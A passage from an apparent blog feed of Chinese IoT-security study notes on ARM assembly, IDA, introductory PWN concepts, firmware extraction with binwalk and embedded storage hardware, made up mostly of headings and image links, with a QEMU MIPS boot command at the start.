class="language-bash">基础指令</span></span><br><span class="line">sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">        -hda debian_wheezy_mipsel_standard.qcow2 \</span><br><span class="line">        -append &quot;root=/dev/sda1 console=tyy0&quot; \</span><br><span class="line">        -net nic \</span><br><span class="line">        -net tap,ifname=tap0 \</span><br><span class="line">        -nographic</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>物联网安全</title>
      <link href="/2024/10/28/%E7%89%A9%E8%81%94%E7%BD%91/"/>
      <url>/2024/10/28/%E7%89%A9%E8%81%94%E7%BD%91/</url>
      
        <content type="html"><![CDATA[<h1 id="逆向基础"><a href="#逆向基础" class="headerlink" title="逆向基础"></a>逆向基础</h1><h2 id="逆向入门介绍"><a href="#逆向入门介绍" class="headerlink" title="逆向入门介绍"></a>逆向入门介绍</h2><h3 id="逆向工程的概念"><a href="#逆向工程的概念" class="headerlink" title="逆向工程的概念"></a>逆向工程的概念</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131504962.png" alt="image-20241013150420915"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131504127.png" alt="image-20241013150435072"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131504191.png" alt="image-20241013150445140"></p><blockquote><p>可执行文件</p><p>win PE</p><p>linux ELF</p><p>BIN</p></blockquote><h3 id="逆向工程的应用"><a href="#逆向工程的应用" class="headerlink" title="逆向工程的应用"></a>逆向工程的应用</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131505068.png" alt="image-20241013150500015"></p><h3 id="软件分析的一般流程"><a href="#软件分析的一般流程" class="headerlink" title="软件分析的一般流程"></a>软件分析的一般流程</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131505777.png" alt="image-20241013150512732"></p><h3 id="软件逆向的前置基础"><a href="#软件逆向的前置基础" class="headerlink" title="软件逆向的前置基础"></a>软件逆向的前置基础</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131505572.png" alt="image-20241013150522522"></p><h2 id="ARM汇编"><a href="#ARM汇编" class="headerlink" title="ARM汇编"></a>ARM汇编</h2><h3 id="什么是ARM"><a href="#什么是ARM" class="headerlink" title="什么是ARM"></a>什么是ARM</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131505804.png" alt="image-20241013150529762"></p><p>A顶级处理</p><p>M数据传输</p><p>R实时处理</p><h3 id="ARM发展"><a href="#ARM发展" class="headerlink" title="ARM发展"></a>ARM发展</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131505633.png" alt="image-20241013150541562"></p><h3 id="ARM大小端"><a href="#ARM大小端" class="headerlink" title="ARM大小端"></a>ARM大小端</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131505114.png" alt="image-20241013150552059"></p><h3 id="ARM基础"><a href="#ARM基础" class="headerlink" title="ARM基础"></a>ARM基础</h3><h4 id="ARM运行模式"><a href="#ARM运行模式" class="headerlink" title="ARM运行模式"></a>ARM运行模式</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131506300.png" alt="image-20241013150602249"></p><h4 id="ARM工作状态"><a href="#ARM工作状态" class="headerlink" title="ARM工作状态"></a>ARM工作状态</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131531190.png" alt="image-20241013153156137"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131506014.png" alt="image-20241013150612938"></p><h4 id="ARM工作状态寄存器"><a href="#ARM工作状态寄存器" class="headerlink" title="ARM工作状态寄存器"></a>ARM工作状态寄存器</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131506962.png" alt="image-20241013150624890"></p><h4 id="Thumb工作状态寄存器"><a href="#Thumb工作状态寄存器" class="headerlink" title="Thumb工作状态寄存器"></a>Thumb工作状态寄存器</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131506872.png" alt="image-20241013150635812"></p><h4 id="对应关系"><a href="#对应关系" class="headerlink" title="对应关系"></a>对应关系</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131506270.png" alt="image-20241013150646197"></p><h4 id="ARM流水线"><a href="#ARM流水线" class="headerlink" title="ARM流水线"></a>ARM流水线</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131506141.png" alt="image-20241013150657057"></p><h3 id="ARM指令集"><a href="#ARM指令集" class="headerlink" title="ARM指令集"></a>ARM指令集</h3><h4 id="ARM状态"><a href="#ARM状态" class="headerlink" title="ARM状态"></a>ARM状态</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131507347.png" alt="image-20241013150708291"></p><h4 id="ARM指令集-1"><a href="#ARM指令集-1" class="headerlink" title="ARM指令集"></a>ARM指令集</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131507303.png" alt="image-20241013150714246"></p><h5 id="数据处理指令"><a href="#数据处理指令" class="headerlink" title="数据处理指令"></a>数据处理指令</h5><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131507476.png" alt="image-20241013150725419"></p><h5 id="算数运算指令"><a href="#算数运算指令" class="headerlink" title="算数运算指令"></a>算数运算指令</h5><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131507110.png" alt="image-20241013150739050"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131507259.png" alt="image-20241013150751199"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131507601.png" alt="image-20241013150758554"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131508821.png" alt="image-20241013150809761"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131508099.png" alt="image-20241013150823036"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131508382.png" alt="image-20241013150835320"></p><h5 id="逻辑运算指令"><a href="#逻辑运算指令" class="headerlink" title="逻辑运算指令"></a>逻辑运算指令</h5><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131508756.png" alt="image-20241013150851685"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131509172.png" alt="image-20241013150903127"></p><h5 id="位清零指令"><a href="#位清零指令" class="headerlink" title="位清零指令"></a>位清零指令</h5><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131509985.png" alt="image-20241013150916927"></p><h5 id="转移指令"><a href="#转移指令" class="headerlink" title="转移指令"></a>转移指令</h5><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131509091.png" alt="image-20241013150930036"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131509473.png" alt="image-20241013150941397"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131509723.png" alt="image-20241009112257159"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131510288.png" alt="image-20241013151003218"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131510240.png" alt="image-20241013151011195"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131510434.png" alt="image-20241013151026386"></p><h5 id="状态寄存器访问指令"><a href="#状态寄存器访问指令" class="headerlink" title="状态寄存器访问指令"></a>状态寄存器访问指令</h5><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131510000.png" alt="image-20241013151054933"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131511289.png" alt="image-20241013151103241"></p><h5 id="加载-x2F-存储指令"><a href="#加载-x2F-存储指令" class="headerlink" title="加载&#x2F;存储指令"></a>加载&#x2F;存储指令</h5><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131511989.png" alt="image-20241013151113938"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131511350.png" alt="image-20241013151129254"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131511571.png" alt="image-20241013151144493"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131511437.png" alt="image-20241013151155383"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131512085.png" alt="image-20241013151222017"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131512727.png" alt="image-20241013151234656"></p><p> <img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131513525.png" alt="image-20241013151300471"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131513628.png" alt="image-20241013151312585"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131513947.png" alt="image-20241013151333875"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131513027.png" alt="image-20241013151353949"></p><h5 id="异常产生指令"><a href="#异常产生指令" class="headerlink" title="异常产生指令"></a>异常产生指令</h5><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131514202.png" alt="image-20241013151404144"></p><h5 id="伪代码"><a href="#伪代码" class="headerlink" title="伪代码"></a>伪代码</h5><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131514872.png" alt="image-20241013151419819"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131514995.png" alt="image-20241013151429929"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131514914.png" alt="image-20241013151459847"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131515146.png" alt="image-20241013151528107"></p><h5 id="环境搭建kali"><a href="#环境搭建kali" class="headerlink" title="环境搭建kali"></a>环境搭建kali</h5><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131515167.png" alt="image-20241013151554116"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131516030.png" alt="image-20241013151604979"></p><h4 id="ARM环境搭建"><a href="#ARM环境搭建" class="headerlink" title="ARM环境搭建"></a>ARM环境搭建</h4><h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><h2 id="静态分析篇"><a href="#静态分析篇" class="headerlink" title="静态分析篇"></a>静态分析篇</h2><h3 id="IDA反汇编窗口"><a href="#IDA反汇编窗口" class="headerlink" title="IDA反汇编窗口"></a>IDA反汇编窗口</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131904779.png" alt="image-20241013190443653"></p><h3 id="IDA伪代码窗口"><a href="#IDA伪代码窗口" class="headerlink" title="IDA伪代码窗口"></a>IDA伪代码窗口</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131516456.png" alt="image-20241013151637361"></p><h3 id="IDA的字符串表"><a href="#IDA的字符串表" class="headerlink" title="IDA的字符串表"></a>IDA的字符串表</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131516762.png" alt="image-20241013151648676"></p><h3 id="IDA数据窗口"><a href="#IDA数据窗口" class="headerlink" title="IDA数据窗口"></a>IDA数据窗口</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131517102.png" alt="image-20241013151702014"></p><h3 id="IDA交叉引用"><a href="#IDA交叉引用" class="headerlink" title="IDA交叉引用"></a>IDA交叉引用</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131517554.png" alt="image-20241013151714404"></p><h3 id="IDA的代码定位"><a href="#IDA的代码定位" class="headerlink" title="IDA的代码定位"></a>IDA的代码定位</h3><h4 id="寻找main函数"><a href="#寻找main函数" class="headerlink" title="寻找main函数"></a>寻找main函数</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131517816.png" alt="image-20241013151733751"></p><h3 id="快捷键总结"><a href="#快捷键总结" class="headerlink" title="快捷键总结"></a>快捷键总结</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131517860.png" alt="image-20241013151745755"></p><h3 id="不同类型的整数"><a href="#不同类型的整数" class="headerlink" title="不同类型的整数"></a>不同类型的整数</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131517516.png" alt="image-20241013151759418"></p><h3 id="LazyIDA提取数据"><a href="#LazyIDA提取数据" class="headerlink" title="LazyIDA提取数据"></a>LazyIDA提取数据</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131519446.png" alt="image-20241013151905313"></p><h3 id="数据与代码的转换"><a href="#数据与代码的转换" class="headerlink" title="数据与代码的转换"></a>数据与代码的转换</h3><h2 id="动态调试篇"><a href="#动态调试篇" class="headerlink" title="动态调试篇"></a>动态调试篇</h2><h2 id="IDA疑难杂症"><a href="#IDA疑难杂症" class="headerlink" title="IDA疑难杂症"></a>IDA疑难杂症</h2><h2 id="IDA脚本编程"><a href="#IDA脚本编程" class="headerlink" title="IDA脚本编程"></a>IDA脚本编程</h2><h2 id="C-逆向"><a href="#C-逆向" class="headerlink" title="C++逆向"></a>C++逆向</h2><h2 id="结构体数组类型修复"><a href="#结构体数组类型修复" class="headerlink" title="结构体数组类型修复"></a>结构体数组类型修复</h2><h2 id="综合实战"><a href="#综合实战" class="headerlink" title="综合实战"></a>综合实战</h2><h1 id="PWN基础"><a href="#PWN基础" class="headerlink" title="PWN基础"></a>PWN基础</h1><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131721520.png" alt="image-20241013172111402"></p><h3 id="常见PWN漏洞"><a href="#常见PWN漏洞" class="headerlink" title="常见PWN漏洞"></a>常见PWN漏洞</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131723421.png" alt="image-20241013172357342"></p><h3 id="PWN基础讲解"><a href="#PWN基础讲解" class="headerlink" title="PWN基础讲解"></a>PWN基础讲解</h3><h4 id="linux内存布局"><a href="#linux内存布局" class="headerlink" title="linux内存布局"></a>linux内存布局</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131728709.png" alt="image-20241013172810608"></p><blockquote><p>堆比栈大很多</p></blockquote><h4 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131734249.png" alt="image-20241013173428140"></p><blockquote><p>nx保护</p></blockquote><h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131738017.png" alt="image-20241013173834841"></p><h3 id="PWN环境搭建"><a href="#PWN环境搭建" class="headerlink" title="PWN环境搭建"></a>PWN环境搭建</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131741739.png" alt="image-20241013174113622"></p><h2 id="PWN工具"><a href="#PWN工具" class="headerlink" title="PWN工具"></a>PWN工具</h2><h3 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131749972.png" alt="image-20241013174939885"></p><blockquote><p>gdg的插件</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131749230.png" alt="image-20241013174951104"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131750559.png" alt="image-20241013175003452"></p><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131750197.png" alt="image-20241013175035104"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131750681.png" alt="image-20241013175048593"></p><h1 id="固件层安全"><a href="#固件层安全" class="headerlink" title="固件层安全"></a>固件层安全</h1><h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><h3 id="文件系统简介"><a href="#文件系统简介" class="headerlink" title="文件系统简介"></a>文件系统简介</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131519154.png" alt="image-20241013151937075"></p><h4 id="根文件系统"><a href="#根文件系统" class="headerlink" title="根文件系统"></a>根文件系统</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131519764.png" alt="image-20241013151955699"></p><h4 id="嵌入式文件系统"><a href="#嵌入式文件系统" class="headerlink" title="嵌入式文件系统"></a>嵌入式文件系统</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131520444.png" alt="image-20241013152009375"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131520068.png" alt="image-20241013152018986"></p><h3 id="常见的文件系统"><a href="#常见的文件系统" class="headerlink" title="常见的文件系统"></a>常见的文件系统</h3><h4 id="jffs"><a href="#jffs" class="headerlink" title="jffs"></a>jffs</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131520467.png" alt="image-20241013152030370"></p><h4 id="cramfs"><a href="#cramfs" class="headerlink" title="cramfs"></a>cramfs</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131520743.png" alt="image-20241013152047637"></p><h4 id="squashfs"><a href="#squashfs" class="headerlink" title="squashfs"></a>squashfs</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131521111.png" alt="image-20241013152101978"></p><h4 id="ubifs"><a href="#ubifs" class="headerlink" title="ubifs"></a>ubifs</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131531465.png" alt="image-20241013153102365"></p><h4 id="ramdisk"><a href="#ramdisk" class="headerlink" title="ramdisk"></a>ramdisk</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131521356.png" alt="image-20241013152134254"></p><h4 id="ramfs"><a href="#ramfs" class="headerlink" title="ramfs"></a>ramfs</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131521007.png" alt="image-20241013152144901"></p><h4 id="nfs"><a href="#nfs" class="headerlink" title="nfs"></a>nfs</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131521487.png" alt="image-20241013152158421"></p><h4 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131522037.png" alt="image-20241013152211925"></p><h4 id="tmpfs"><a href="#tmpfs" class="headerlink" title="tmpfs"></a>tmpfs</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131522626.png" alt="image-20241013152249532"></p><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><h3 id="操作系统简介"><a href="#操作系统简介" class="headerlink" title="操作系统简介"></a>操作系统简介</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131523683.png" alt="image-20241013152304616"></p><h3 id="操作系统的作用"><a href="#操作系统的作用" class="headerlink" title="操作系统的作用"></a>操作系统的作用</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131523408.png" alt="image-20241013152315345"></p><h3 id="操作系统的分类"><a href="#操作系统的分类" class="headerlink" title="操作系统的分类"></a>操作系统的分类</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131523521.png" alt="image-20241013152328447"></p><h2 id="嵌入式操作系统"><a href="#嵌入式操作系统" class="headerlink" title="嵌入式操作系统"></a>嵌入式操作系统</h2><h3 id="分时操作系统"><a href="#分时操作系统" class="headerlink" title="分时操作系统"></a>分时操作系统</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131523393.png" alt="image-20241013152340318"></p><h3 id="linux操作系统"><a href="#linux操作系统" class="headerlink" title="linux操作系统"></a>linux操作系统</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131523644.png" alt="image-20241013152353548"></p><h4 id="linux目录结构"><a href="#linux目录结构" class="headerlink" title="linux目录结构"></a>linux目录结构</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131524873.png" alt="image-20241013152407815"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131524401.png" alt="image-20241013152418332"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131524369.png" alt="image-20241013152433298"></p><h4 id="linux镜像"><a href="#linux镜像" class="headerlink" title="linux镜像"></a>linux镜像</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131524756.png" alt="image-20241013152454692"></p><h3 id="实时操作系统"><a href="#实时操作系统" class="headerlink" title="实时操作系统"></a>实时操作系统</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131530864.png" alt="image-20241013153040807"></p><h3 id="RTOS操作系统"><a href="#RTOS操作系统" class="headerlink" title="RTOS操作系统"></a>RTOS操作系统</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131525326.png" alt="image-20241013152502276"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131525707.png" alt="image-20241013152518649"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131525411.png" alt="image-20241013152528363"></p><h3 id="VxWorks操作系统"><a href="#VxWorks操作系统" class="headerlink" title="VxWorks操作系统"></a>VxWorks操作系统</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131525349.png" alt="image-20241013152539283"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131525444.png" alt="image-20241013152551374"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131526751.png" alt="image-20241013152602702"></p><h2 id="固件"><a href="#固件" class="headerlink" title="固件"></a>固件</h2><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131526437.png" alt="image-20241013152615304"></p><h2 id="固件获取"><a href="#固件获取" class="headerlink" title="固件获取"></a>固件获取</h2><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131526692.png" alt="image-20241013152623593"></p><h3 id="官网下载"><a href="#官网下载" class="headerlink" title="官网下载"></a>官网下载</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131526158.png" alt="image-20241013152637070"></p><h3 id="第三方购买"><a href="#第三方购买" class="headerlink" title="第三方购买"></a>第三方购买</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131526875.png" alt="image-20241013152655824"></p><h3 id="升级，抓包"><a href="#升级，抓包" class="headerlink" title="升级，抓包"></a>升级，抓包</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131527337.png" alt="image-20241013152709256"></p><h3 id="上位机软件"><a href="#上位机软件" class="headerlink" title="上位机软件"></a>上位机软件</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131527845.png" alt="image-20241013152721771"></p><h3 id="flash内存读取"><a href="#flash内存读取" class="headerlink" title="flash内存读取"></a>flash内存读取</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131527425.png" alt="image-20241013152736323"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131527566.png" alt="image-20241013152749390"></p><h3 id="调试接口"><a href="#调试接口" class="headerlink" title="调试接口"></a>调试接口</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131528377.png" alt="image-20241013152809312"></p><h3 id="逻辑分析仪"><a href="#逻辑分析仪" class="headerlink" title="逻辑分析仪"></a>逻辑分析仪</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131528965.png" alt="image-20241013152819870"></p><h2 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h2><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131528348.png" alt="image-20241013152836267"></p><h3 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131528435.png" alt="image-20241013152848333"></p><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131528595.png" alt="image-20241013152859505"></p><h3 id="hexdump"><a href="#hexdump" class="headerlink" title="hexdump"></a>hexdump</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131529113.png" alt="image-20241013152917037"></p><h3 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131529239.png" alt="image-20241013152934153"></p><p>查看是否加密</p><p>binwalk -E</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131529451.png" alt="image-20241013152946383"></p><p>递归提取</p><p>binwalk -Me</p><h3 id="dd"><a href="#dd" class="headerlink" title="dd"></a>dd</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131529680.png" alt="image-20241013152957593"></p><h3 id="fdisk"><a href="#fdisk" class="headerlink" title="fdisk"></a>fdisk</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131530341.png" alt="image-20241013153009271"></p><h1 id="硬件安全"><a href="#硬件安全" class="headerlink" title="硬件安全"></a>硬件安全</h1><h2 id="硬件简介"><a href="#硬件简介" class="headerlink" title="硬件简介"></a>硬件简介</h2><h3 id="物联网硬件"><a href="#物联网硬件" class="headerlink" title="物联网硬件"></a>物联网硬件</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131228324.png" alt="image-20241013122802206"></p><h3 id="物联网硬件组成"><a href="#物联网硬件组成" class="headerlink" title="物联网硬件组成"></a>物联网硬件组成</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131228514.png" alt="image-20241013122829457"></p><h3 id="印刷电路板"><a href="#印刷电路板" class="headerlink" title="印刷电路板"></a>印刷电路板</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131228633.png" alt="image-20241013122849533"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131229895.png" alt="image-20241013122903794"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131229093.png" alt="image-20241013122917018"></p><h3 id="ROM"><a href="#ROM" class="headerlink" title="ROM"></a>ROM</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131231345.png" alt="image-20241013123134242"></p><h3 id="RAM"><a href="#RAM" class="headerlink" title="RAM"></a>RAM</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131231149.png" alt="image-20241013123149057"></p><h3 id="Flash"><a href="#Flash" class="headerlink" title="Flash"></a>Flash</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131232606.png" alt="image-20241013123206511"></p><h3 id="ROM的种类"><a href="#ROM的种类" class="headerlink" title="ROM的种类"></a>ROM的种类</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131234459.png" alt="image-20241013123406410"></p><h3 id="ROM物理"><a href="#ROM物理" class="headerlink" title="ROM物理"></a>ROM物理</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131234537.png" alt="image-20241013123428476"></p><h3 id="RAM种类"><a href="#RAM种类" class="headerlink" title="RAM种类"></a>RAM种类</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131235493.png" alt="image-20241013123521412"></p><h3 id="RAM物理"><a href="#RAM物理" class="headerlink" title="RAM物理"></a>RAM物理</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131235374.png" alt="image-20241013123539296"></p><h3 id="Flash种类"><a href="#Flash种类" class="headerlink" title="Flash种类"></a>Flash种类</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131236512.png" alt="image-20241013123632449"></p><blockquote><p>一般老说nor更快，nand更大</p></blockquote><h3 id="NOR-Flash"><a href="#NOR-Flash" class="headerlink" title="NOR Flash"></a>NOR Flash</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131236254.png" alt="image-20241013123646178"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131236345.png" alt="image-20241013123656289"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131237905.png" alt="image-20241013123712812"></p><h3 id="NAND-Flash"><a href="#NAND-Flash" class="headerlink" title="NAND Flash"></a>NAND Flash</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131237883.png" alt="image-20241013123744820"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131237797.png" alt="image-20241013123755716"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131238869.png" alt="image-20241013123804814"></p><h3 id="EMMC"><a href="#EMMC" class="headerlink" title="EMMC"></a>EMMC</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131238974.png" alt="image-20241013123842894"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131238094.png" alt="image-20241013123857006"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131239100.png" alt="image-20241013123910036"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131239582.png" alt="image-20241013123918534"></p><h2 id="芯片识别网站"><a href="#芯片识别网站" class="headerlink" title="芯片识别网站"></a>芯片识别网站</h2><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131239825.png" 